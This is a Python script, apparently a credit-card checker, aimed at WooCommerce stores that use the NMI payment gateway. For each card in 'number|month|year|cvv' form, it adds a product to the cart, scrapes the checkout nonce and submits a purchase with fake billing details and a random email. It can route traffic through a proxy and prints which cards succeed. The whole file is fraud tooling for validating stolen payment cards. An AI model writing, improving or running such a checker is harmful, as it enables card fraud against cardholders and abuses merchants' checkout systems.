import requests
import random
import string
import json
import re

def stripTags(input_string):
    cleaned = re.sub(r'</?[^>]+(>|$)', '', input_string)
    cleaned = re.sub(r'\s+', ' ', cleaned).strip()
    return cleaned

def nmi_api(domain, creditCard, proxy):
    G = "\033[38;5;82m"
    Y ="\033[38;5;226m"
    R2 = "\033[38;5;202m"
    R = "\033[0m"
    cc, mm, yy, cvv = creditCard.strip().split('|')
    session = requests.Session()

    if proxy:
        session.proxies = proxy

    #requests 1
    try:
        url = f"https://{domain}/?=&post_type=product"

        response = session.get(url, proxies=proxy)
        split_text = response.text.split('data-product_id="')
        if len(split_text) > 1:
            id = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] {cc}|{mm}|{yy}|{cvv} Product ID not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] requests 1 An error occurred during processing: {e}")

    #requests 2
    try:
        url = f"https://{domain}/?wc-ajax=add_to_cart"
        data = {
            'quantity': 1,
            'add-to-cart': id
        }

        response = session.post(url, data=data, proxies=proxy)

        if response.status_code not in (200, 302):
            return print(f'[{Y}!{R}] {cc}|{mm}|{yy}|{cvv} Failed to add item to cart.')

    except Exception as e:
        return print(f"[{Y}!{R}] requests 2 An error occurred during processing: {e}")
    
    #requests 3
    try:
        url = f"https://{domain}/checkout/"
        response = session.get(url, proxies=proxy)

        split_text = response.text.split('name="woocommerce-process-checkout-nonce" value="')
        if len(split_text) > 1:
            checkoutNonce = split_text[1].split('"')[0]
        else:
            return print(f"[{Y}!{R}] Checkout nonce not found in the response.")

    except Exception as e:
        return print(f"[{Y}!{R}] requests 3 An error occurred during processing: {e}")
    
    #requests 4
    try:
        url = f"https://{domain}/?wc-ajax=checkout"
        data = {
            'billing_first_name': 'Danyka',
            'billing_last_name': 'Kunde',
            'billing_country': 'US',
            'billing_address_1': '90154 Alanna Rapid Suite 080',
            'billing_city': 'New York',
            'billing_state': 'NY',
            'billing_postcode': '10080',
            'billing_phone': '5809662076',
            'billing_email': ''.join(random.choices(string.ascii_letters + string.digits, k=16)) + '@gmail.com',
            'payment_method': 'nmi',
            'nmi-card-number': cc,
            'nmi-card-expiry': f'{mm} / {yy}',
            'nmi-card-cvc': cvv,
            'woocommerce-process-checkout-nonce': checkoutNonce
        }

        response = session.post(url, data=data, proxies=proxy)
    
        if response.status_code == 200:
            status = stripTags(json.loads(response.text)["result"])
        
        if 'success' in status:
            receipt = stripTags(json.loads(response.text)["redirect"])
            return print(f"[{G}+{R}] {cc}|{mm}|{yy}|{cvv} {receipt}")
        elif 'failure' in status:
            message = stripTags(json.loads(response.text)["messages"])
            return print(f"[{R2}-{R}] {cc}|{mm}|{yy}|{cvv} {message}")
        else:
            return print(f"[{Y}!{R}] {cc}|{mm}|{yy}|{cvv} {response.text}")

    except Exception as e:
        return print(f"[{Y}!{R}] requests 4 An error occurred during processing: {e}")